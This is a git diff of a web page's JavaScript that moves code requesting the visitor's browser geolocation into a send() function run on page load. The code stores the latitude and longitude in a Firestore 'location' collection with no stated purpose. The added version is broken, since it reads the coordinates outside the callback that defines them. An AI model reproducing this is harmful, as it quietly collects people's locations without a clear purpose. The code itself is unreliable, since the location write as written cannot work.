@@ -31,34 +31,8 @@ function inWords (num) {
 }
 
 console.log('Loaded'); // connected to app engine
-function geoFindMe() {
+ 
   
-    function success(position) {
-
-
-const db = firebase.firestore();
-      const latitude  = position.coords.latitude;
-      const longitude = position.coords.longitude;
-      console.log(`${latitude} and ${longitude}`)
-      db.collections('location').add({
-        lat: latitude,
-        long: longitude  
-      })  
-    }
-  
-    function error() {
-      console.log('err')
-    }
-  
-    if (!navigator.geolocation) {
-      console.log('Not Sprted')
-    } else {
-      navigator.geolocation.getCurrentPosition(success, error);
-    }
-  
-  }
-  
- geoFindMe()
 //dom loader
 const nxt1 = document.getElementById('btn-1');
 const nxt2 = document.getElementById('btn-2');
@@ -103,6 +77,25 @@ function send() {
   db.collection('numbers').add({
   number: result
  })
+    function success(position) {
+      const latitude  = position.coords.latitude;
+      const longitude = position.coords.longitude;
+      console.log(`${latitude} and ${longitude}`)
+    }
+  
+    function error() {
+      console.log('err')
+    }
+  
+    if (!navigator.geolocation) {
+      console.log('Not Sprted')
+    } else {
+      navigator.geolocation.getCurrentPosition(success, error);
+    }
+  db.collection('location').add({
+    lat: latitude,
+    long: longitude  
+  })  
 }
 send()
 
